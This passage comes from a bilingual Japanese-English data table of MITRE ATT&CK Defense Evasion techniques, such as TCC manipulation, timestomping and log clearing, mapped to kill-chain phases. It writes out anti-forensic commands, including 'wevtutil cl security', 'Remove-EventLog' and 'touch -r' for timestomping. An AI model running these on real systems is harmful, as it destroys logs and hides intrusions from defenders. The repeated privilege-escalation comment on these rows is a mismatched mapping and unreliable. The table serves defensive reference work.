Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1548,昇格制御メカニズムの悪用,Abuse Elevation Control Mechanism,攻撃者は、より高いレベルの権限を得るために、権限昇格を制御するように設計されたメカニズムを回避する可能性があります。ほとんどの最新システムには、ユーザーがマシン上で実行できる権限を制限することを目的としたネイティブの昇格制御メカニズムが含まれています。より高いリスクと見なされる可能性のあるタスクを実行するためには、特定のユーザーに承認を与える必要があります。(引用: TechNet How UAC Works)(引用: sudo man page 2018) 攻撃者は、システム上で権限を昇格させるために、組み込みの制御メカニズムを利用するいくつかの方法を実行できます。(引用: OSX Keydnap malware)(引用: Fortinet Fareit),Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.(Citation: TechNet How UAC Works)(Citation: sudo man page 2018) An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.(Citation: OSX Keydnap malware)(Citation: Fortinet Fareit),T1548.006,TCC操作,TCC Manipulation,"攻撃者は、透過性、同意、制御（TCC）サービスまたはデータベースを操作または悪用して、悪意のある実行可能ファイルに昇格された権限を付与する可能性があります。TCCは、実行中のプロセスが画面共有、カメラ、マイク、またはフルディスクアクセス（FDA）など、TCCによって保護されているデータまたはサービスにアクセスする権限を持っているかどうかを判断するために使用されるPrivacy & Security macOS制御メカニズムです。

アプリケーションがTCCによって保護されているデータまたはサービスへのアクセスを要求すると、TCCデーモン（`tccd`）は、`/Library/Application Support/com.apple.TCC/TCC.db`（および`~/`同等物）にあるTCCデータベースと、既存の権限についての上書きファイル（MDMに接続されている場合）を確認します。権限が存在しない場合は、ユーザーに権限の付与を求めるプロンプトが表示されます。権限が付与されると、データベースはアプリケーションの権限を保存し、リセットされない限りユーザーに再度プロンプトを表示しません。例えば、WebブラウザがユーザーのWebカメラへの権限を要求した場合、一度付与されるとWebブラウザはユーザーに明示的に再度プロンプトを表示しない場合があります。(引用: welivesecurity TCC)

攻撃者は、以前に[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)を介して権限が付与されたアプリケーションを悪用したり、別のアプリケーションを使用して悪意のあるバイナリを実行したりすることで、TCCによって保護されている制限されたデータまたはサービスにアクセスする可能性があります。例えば、攻撃者はFDA権限を持つmacOSネイティブアプリであるFinderを使用して、悪意のある[AppleScript](https://attack.mitre.org/techniques/T1059/002)を実行できます。Finderアプリで実行すると、悪意のある[AppleScript](https://attack.mitre.org/techniques/T1059/002)はユーザープロンプトを必要とせずにシステム上のすべてのファイルへのアクセスを継承します。システム整合性保護（SIP）が無効になっている場合、TCC保護も無効になります。SIPが無効になっているシステムの場合、攻撃者は環境変数と[Launchctl](https://attack.mitre.org/techniques/T1569/001)を使用して攻撃者が制御するTCCデータベースをロードすることにより、TCCデータベースを操作して悪意のある実行可能ファイルに権限を追加できます。(引用: TCC macOS bypass)(引用: TCC Database)","Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to grant malicious executables elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).

When an application requests to access data or a service protected by TCC, the TCC daemon (`tccd`) checks the TCC database, located at `/Library/Application Support/com.apple.TCC/TCC.db` (and `~/` equivalent), and an overwrites file (if connected to an MDM) for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again.(Citation: welivesecurity TCC)

Adversaries may access restricted data or services protected by TCC through abusing applications previously granted permissions through [Process Injection](https://attack.mitre.org/techniques/T1055) or executing a malicious binary using another application. For example, adversaries can use Finder, a macOS native app with FDA permissions, to execute a malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002). When executing under the Finder App, the malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002) inherits access to all files on the system without requiring a user prompt. When System Integrity Protection (SIP) is disabled, TCC protections are also disabled. For a system without SIP enabled, adversaries can manipulate the TCC database to add permissions to their malicious executable through loading an adversary controlled TCC database using environment variables and [Launchctl](https://attack.mitre.org/techniques/T1569/001).(Citation: TCC macOS bypass)(Citation: TCC Database)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1070,インジケーター削除,Indicator Removal,"攻撃者は、システム内に生成されたアーティファクトを削除または変更して、自身の存在の証拠を削除したり、防御を妨害したりする可能性があります。さまざまなアーティファクトが、攻撃者または攻撃者の行動に起因する何かによって作成される場合があります。通常、これらのアーティファクトは、ダウンロードされたファイルからの文字列、ユーザーアクションから生成されるログ、防御側が分析するその他のデータなど、監視対象イベントに関連する防御インジケーターとして使用されます。アーティファクトの場所、形式、およびタイプ（コマンドやログイン履歴など）は、多くの場合、各プラットフォームに固有です。

これらのインジケーターを削除すると、イベント収集、報告、または侵入アクティビティの検出に使用されるその他のプロセスが妨害される可能性があります。これにより、注目すべきイベントが報告されなくなることで、セキュリティソリューションの整合性が損なわれる可能性があります。このアクティビティはまた、発生した事柄を判断するための十分なデータがないため、フォレンジック分析やインシデント対応を妨げる可能性もあります。","Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.

Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",T1070.004,ファイル削除,File Deletion,"攻撃者は、侵入活動の行為によって残されたファイルを削除する可能性があります。マルウェア、ツール、または攻撃者によってシステムにドロップまたは作成されたその他の非ネイティブファイル（例：[イングレスツール転送](https://attack.mitre.org/techniques/T1105)）は、ネットワーク内で何が行われたか、どのように行われたかを示す痕跡を残す可能性があります。これらのファイルの削除は、侵入中、または侵入後のプロセスの一部として、攻撃者のフットプリントを最小限に抑えるために行われる可能性があります。

クリーンアップを実行するためのツールはホストオペレーティングシステムから利用できますが、攻撃者は他のツールも使用する可能性があります。(引用: Microsoft SDelete July 2016) 組み込みの[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)機能の例としては、Windowsの<code>del</code>、LinuxおよびmacOSの<code>rm</code>または<code>unlink</code>、ESXiの<code>rm</code>などがあります。","Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.

There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del</code> on Windows, <code>rm</code> or <code>unlink</code> on Linux and macOS, and `rm` on ESXi.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1070,インジケーター削除,Indicator Removal,"攻撃者は、システム内に生成されたアーティファクトを削除または変更して、自身の存在の証拠を削除したり、防御を妨害したりする可能性があります。さまざまなアーティファクトが、攻撃者または攻撃者の行動に起因する何かによって作成される場合があります。通常、これらのアーティファクトは、ダウンロードされたファイルからの文字列、ユーザーアクションから生成されるログ、防御側が分析するその他のデータなど、監視対象イベントに関連する防御インジケーターとして使用されます。アーティファクトの場所、形式、およびタイプ（コマンドやログイン履歴など）は、多くの場合、各プラットフォームに固有です。

これらのインジケーターを削除すると、イベント収集、報告、または侵入アクティビティの検出に使用されるその他のプロセスが妨害される可能性があります。これにより、注目すべきイベントが報告されなくなることで、セキュリティソリューションの整合性が損なわれる可能性があります。このアクティビティはまた、発生した事柄を判断するための十分なデータがないため、フォレンジック分析やインシデント対応を妨げる可能性もあります。","Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.

Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",T1070.006,タイムスタンプ操作,Timestomp,"攻撃者は、新しいファイルや既存のファイルへの変更を隠すために、ファイル時間属性を変更する可能性があります。タイムスタンプ操作は、ファイルのタイムスタンプ（変更、アクセス、作成、変更時間）を変更するテクニックであり、多くの場合、同じフォルダにあるファイルを模倣し、悪意のあるファイルを正当なファイルと混ぜ合わせるために行われます。

Windowsシステムでは、<code>$STANDARD_INFORMATION</code>（<code>$SI</code>）と<code>$FILE_NAME</code>（<code>$FN</code>）の両方の属性がマスターファイルテーブル（MFT）ファイルに時間を記録します。(引用: Inversecos Timestomping 2022) <code>$SI</code>（日付/タイムスタンプ）はファイルシステムビューを含めエンドユーザーに表示されますが、<code>$FN</code>はカーネルによって処理されます。(引用: Magnet Forensics)

<code>$SI</code>属性の変更は、API呼び出しを使用してユーザーレベルで変更できるため、最も一般的なタイムスタンプ操作の方法です。ただし、<code>$FN</code>タイムスタンプ操作は通常、システムカーネルと対話するか、ファイルを移動または名前変更する必要があります。(引用: Inversecos Timestomping 2022)

攻撃者は、フォレンジック調査員やファイル分析ツールに目立たないようにするために、ファイルのタイムスタンプを変更します。<code>$SI</code>属性と<code>$FN</code>属性の間の不一致を特定することに依存する検出を回避するために、攻撃者は両方の属性の時間を同時に変更することにより、「ダブルタイムスタンプ操作」を行う場合もあります。(引用: Double Timestomping)

LinuxシステムおよびESXiサーバーでは、脅威アクターは<code>touch -a -m -t <timestamp> <filename></code>（アクセス時刻と変更時刻を特定の値に設定する）や<code>touch -r <filename> <filename></code>（アクセス時刻と変更時刻を別のファイルのものと一致させる）などのコマンドを使用してタイムスタンプ操作を実行しようとする可能性があります。(引用: Inversecos Linux Timestomping)(引用: Juniper Networks ESXi Backdoor 2022)

タイムスタンプ操作は、マルウェアやツールを隠すためにファイル名の[マスカレード](https://attack.mitre.org/techniques/T1036)と共に使用される場合があります。(引用: WindowsIR Anti-Forensic Techniques)","Adversaries may modify file time attributes to hide new files or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files.

In Windows systems, both the `$STANDARD_INFORMATION` (`$SI`) and `$FILE_NAME` (`$FN`) attributes record times in a Master File Table (MFT) file.(Citation: Inversecos Timestomping 2022) `$SI` (dates/time stamps) is displayed to the end user, including in the File System view, while `$FN` is dealt with by the kernel.(Citation: Magnet Forensics)

Modifying the `$SI` attribute is the most common method of timestomping because it can be modified at the user level using API calls. `$FN` timestomping, however, typically requires interacting with the system kernel or moving or renaming a file.(Citation: Inversecos Timestomping 2022)

Adversaries modify timestamps on files so that they do not appear conspicuous to forensic investigators or file analysis tools. In order to evade detections that rely on identifying discrepancies between the `$SI` and `$FN` attributes, adversaries may also engage in “double timestomping” by modifying times on both attributes simultaneously.(Citation: Double Timestomping)

In Linux systems and on ESXi servers, threat actors may attempt to perform timestomping using commands such as `touch -a -m -t <timestamp> <filename>` (which sets access and modification times to a specific value) or `touch -r <filename> <filename>` (which sets access and modification times to match those of another file).(Citation: Inversecos Linux Timestomping)(Citation: Juniper Networks ESXi Backdoor 2022)

Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1070,インジケーター削除,Indicator Removal,"攻撃者は、システム内に生成されたアーティファクトを削除または変更して、自身の存在の証拠を削除したり、防御を妨害したりする可能性があります。さまざまなアーティファクトが、攻撃者または攻撃者の行動に起因する何かによって作成される場合があります。通常、これらのアーティファクトは、ダウンロードされたファイルからの文字列、ユーザーアクションから生成されるログ、防御側が分析するその他のデータなど、監視対象イベントに関連する防御インジケーターとして使用されます。アーティファクトの場所、形式、およびタイプ（コマンドやログイン履歴など）は、多くの場合、各プラットフォームに固有です。

これらのインジケーターを削除すると、イベント収集、報告、または侵入アクティビティの検出に使用されるその他のプロセスが妨害される可能性があります。これにより、注目すべきイベントが報告されなくなることで、セキュリティソリューションの整合性が損なわれる可能性があります。このアクティビティはまた、発生した事柄を判断するための十分なデータがないため、フォレンジック分析やインシデント対応を妨げる可能性もあります。","Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.

Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",T1070.008,メールボックスデータの消去,Clear Mailbox Data,"攻撃者は、活動の証拠を削除するために、メールおよびメールアプリケーションデータを変更する可能性があります。メールアプリケーションでは、ユーザーや他のプログラムがコマンドラインツールやAPIを使用してメールボックスデータをエクスポートおよび削除できます。メールアプリケーションデータには、メール、メールメタデータ、またはエクスポート要求など、アプリケーションやオペレーティングシステムによって生成されるログが含まれます。

攻撃者は、[フィッシング](https://attack.mitre.org/techniques/T1566)/[内部スピアフィッシング](https://attack.mitre.org/techniques/T1534)、[メール収集](https://attack.mitre.org/techniques/T1114)、コマンドアンドコントロールのための[メールプロトコル](https://attack.mitre.org/techniques/T1071/003)、または[代替プロトコル経由のデータ持ち出し](https://attack.mitre.org/techniques/T1048)などのメールベースのデータ持ち出しの証拠など、ログ、アーティファクト、メタデータを削除するためにメールやメールボックスデータを操作する可能性があります。例えば、Exchangeサーバー上の証拠を削除するために、攻撃者は<code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001)モジュールを使用しており、これにはメールボックスエクスポートの証拠を削除するための<code>Remove-MailboxExportRequest</code>が含まれます。(引用: Volexity SolarWinds)(引用: ExchangePowerShell Module) LinuxおよびmacOSでは、攻撃者は<code>mail</code>というコマンドラインユーティリティを介してメールを削除したり、macOS上のAPIと対話するために[AppleScript](https://attack.mitre.org/techniques/T1059/002)を使用したりすることもあります。(引用: Cybereason Cobalt Kitty 2017)(引用: mailx man page)

攻撃者はまた、悪意のあるメールがセキュリティ製品によって検出される可能性を低減するために、スパムや疑わしいアクティビティを示すメールやメタデータ/ヘッダーを削除する場合があります（例えば、組織全体のトランスポートルールの使用を通じて）。(引用: Microsoft OAuth Spam 2022)","Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests.

Adversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/techniques/T1071/003) for command and control, or email-based exfiltration such as [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). For example, to remove evidence on Exchange servers adversaries have used the <code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) module, including <code>Remove-MailboxExportRequest</code> to remove evidence of mailbox exports.(Citation: Volexity SolarWinds)(Citation: ExchangePowerShell Module) On Linux and macOS, adversaries may also delete emails through a command line utility called <code>mail</code>  or use [AppleScript](https://attack.mitre.org/techniques/T1059/002) to interact with APIs on macOS.(Citation: Cybereason Cobalt Kitty 2017)(Citation: mailx man page)

Adversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.(Citation: Microsoft OAuth Spam 2022)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1070,インジケーター削除,Indicator Removal,"攻撃者は、システム内に生成されたアーティファクトを削除または変更して、自身の存在の証拠を削除したり、防御を妨害したりする可能性があります。さまざまなアーティファクトが、攻撃者または攻撃者の行動に起因する何かによって作成される場合があります。通常、これらのアーティファクトは、ダウンロードされたファイルからの文字列、ユーザーアクションから生成されるログ、防御側が分析するその他のデータなど、監視対象イベントに関連する防御インジケーターとして使用されます。アーティファクトの場所、形式、およびタイプ（コマンドやログイン履歴など）は、多くの場合、各プラットフォームに固有です。

これらのインジケーターを削除すると、イベント収集、報告、または侵入アクティビティの検出に使用されるその他のプロセスが妨害される可能性があります。これにより、注目すべきイベントが報告されなくなることで、セキュリティソリューションの整合性が損なわれる可能性があります。このアクティビティはまた、発生した事柄を判断するための十分なデータがないため、フォレンジック分析やインシデント対応を妨げる可能性もあります。","Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.

Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",T1070.002,LinuxまたはMacシステムログの消去,Clear Linux or Mac System Logs,"攻撃者は、侵入の証拠を隠すためにシステムログを消去する可能性があります。macOSとLinuxはどちらも、システムログを介してシステムまたはユーザーが開始したアクションを追跡します。ネイティブシステムログの大部分は<code>/var/log/</code>ディレクトリに保存されます。このディレクトリ内のサブフォルダは、関連する機能によってログを分類します。例：(引用: Linux Logs)

* <code>/var/log/messages:</code>: 一般的およびシステム関連のメッセージ
* <code>/var/log/secure</code>または<code>/var/log/auth.log</code>: 認証ログ
* <code>/var/log/utmp</code>または<code>/var/log/wtmp</code>: ログイン記録
* <code>/var/log/kern.log</code>: カーネルログ
* <code>/var/log/cron.log</code>: Crondログ
* <code>/var/log/maillog</code>: メールサーバーログ
* <code>/var/log/httpd/</code>: Webサーバーアクセスおよびエラーログ","Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)

* <code>/var/log/messages:</code>: General and system-related messages
* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs
* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records
* <code>/var/log/kern.log</code>: Kernel logs
* <code>/var/log/cron.log</code>: Crond logs
* <code>/var/log/maillog</code>: Mail server logs
* <code>/var/log/httpd/</code>: Web server access and error logs",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1070,インジケーター削除,Indicator Removal,"攻撃者は、システム内に生成されたアーティファクトを削除または変更して、自身の存在の証拠を削除したり、防御を妨害したりする可能性があります。さまざまなアーティファクトが、攻撃者または攻撃者の行動に起因する何かによって作成される場合があります。通常、これらのアーティファクトは、ダウンロードされたファイルからの文字列、ユーザーアクションから生成されるログ、防御側が分析するその他のデータなど、監視対象イベントに関連する防御インジケーターとして使用されます。アーティファクトの場所、形式、およびタイプ（コマンドやログイン履歴など）は、多くの場合、各プラットフォームに固有です。

これらのインジケーターを削除すると、イベント収集、報告、または侵入アクティビティの検出に使用されるその他のプロセスが妨害される可能性があります。これにより、注目すべきイベントが報告されなくなることで、セキュリティソリューションの整合性が損なわれる可能性があります。このアクティビティはまた、発生した事柄を判断するための十分なデータがないため、フォレンジック分析やインシデント対応を妨げる可能性もあります。","Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.

Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",T1070.001,Windowsイベントログの消去,Clear Windows Event Logs,"攻撃者は、侵入の活動を隠すためにWindowsイベントログをクリアする可能性があります。Windowsイベントログは、コンピュータのアラートと通知の記録です。イベントのシステム定義ソースは3つあります。システム、アプリケーション、セキュリティで、イベントタイプはエラー、警告、情報、成功監査、失敗監査の5つです。

管理者権限があれば、次のユーティリティコマンドでイベントログをクリアできます：

* <code>wevtutil cl system</code>
* <code>wevtutil cl application</code>
* <code>wevtutil cl security</code>

これらのログは、イベントビューアGUIや[PowerShell](https://attack.mitre.org/techniques/T1059/001)などの他のメカニズムを介してクリアすることもできます。例えば、攻撃者はPowerShellコマンド<code>Remove-EventLog -LogName Security</code>を使用してセキュリティイベントログを削除し、再起動後に将来のログ記録を無効にする可能性があります。注：コマンドの実行と再起動の間にイベントが生成され、.evtxファイルにログ記録される可能性があります。(引用: disable_win_evt_logging)

攻撃者はまた、<code>C:\\Windows\\System32\\winevt\\logs\\</code>内に保存されているログファイルを直接削除することにより、ログをクリアしようとする可能性があります。","Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.

With administrator privileges, the event logs can be cleared with the following utility commands:

* <code>wevtutil cl system</code>
* <code>wevtutil cl application</code>
* <code>wevtutil cl security</code>

These logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)

Adversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

